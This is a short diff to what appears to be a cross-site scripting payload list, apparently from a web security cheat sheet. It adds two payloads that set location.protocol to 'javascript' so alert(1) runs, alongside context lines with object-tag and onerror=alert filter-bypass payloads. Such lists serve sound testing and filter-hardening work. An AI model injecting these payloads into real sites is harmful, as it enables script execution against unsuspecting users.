@@ -992,6 +992,8 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>
 <object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>
 <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>
+<script>location.protocol='javascript'<\/script>
+<a href=\"%0aalert(1)\" onclick=\"protocol='javascript'\">test<\/a>
 <script>onerror=alert;throw 1<\/script>
 <script>{onerror=alert}throw 1<\/script>
 <script>throw onerror=alert,1<\/script>
